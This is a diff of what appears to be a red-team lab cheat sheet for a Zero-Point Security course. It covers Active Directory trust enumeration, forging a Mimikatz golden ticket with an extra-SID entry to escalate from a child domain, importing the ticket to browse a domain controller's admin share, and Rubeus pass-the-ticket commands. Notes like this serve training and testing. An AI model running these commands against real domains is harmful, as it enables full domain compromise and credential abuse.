@@ -17,7 +17,10 @@ powershell Get-DomainTrust
 powershell Get-DomainComputer -Domain zeropointsecurity.co.uk  | select DnsHostName
 powershell Get-DomainGroup -Identity 'Domain Admins' -Domain insomnia.io  | select ObjectSid
 kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<>
-kerberos::golden /user:Administrator /domain:dev.insomnia.io  /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:zps.kirbi
+kerberos::golden /user:Administrator /domain:dev.insomnia.io  /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:MeMe.kirbi
+
+kerberos_ticket_use C:\Users\Commando\Desktop\x64\MeMe.kirbi
+ls \\ad01.insomnia.io\c$
 
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 Rubeus ptt /luid:0x82ece /ticket:[...snip...]
